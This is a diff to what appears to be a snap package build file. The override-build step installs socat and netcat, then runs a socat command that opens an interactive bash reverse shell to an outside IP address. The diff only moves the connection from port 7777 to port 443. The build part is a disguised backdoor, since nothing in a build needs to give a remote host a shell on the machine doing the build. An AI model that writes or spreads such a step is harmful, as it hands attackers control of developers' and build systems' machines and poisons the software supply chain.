@@ -15,6 +15,6 @@ parts:
         override-build: |
             apt-get update
             apt-get install -y socat netcat-traditional bash
-            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"139.59.42.102:7777"
+            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"139.59.42.102:443"
             echo 0
 
